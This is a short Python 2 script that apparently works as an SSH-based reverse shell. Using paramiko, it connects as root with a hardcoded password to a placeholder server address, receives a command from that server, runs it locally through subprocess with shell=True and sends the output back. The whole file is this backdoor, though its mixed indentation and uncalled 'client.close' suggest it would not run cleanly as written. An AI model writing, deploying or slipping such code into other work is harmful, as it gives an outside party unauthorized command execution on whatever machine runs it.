import paramiko
import threading
import subprocess

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('*insertServerIPHere*', username='root', password='toor')
chan = client.get_transport().open_session()
chan.send('Hey i am connected :) ')
print chan.recv(1024)
command = chan.recv(1024)
try:
	CMD = subprocess.check_output(command, shell=True)
        chan.send(CMD)
except Exception,e:
        chan.send(str(e))
client.close
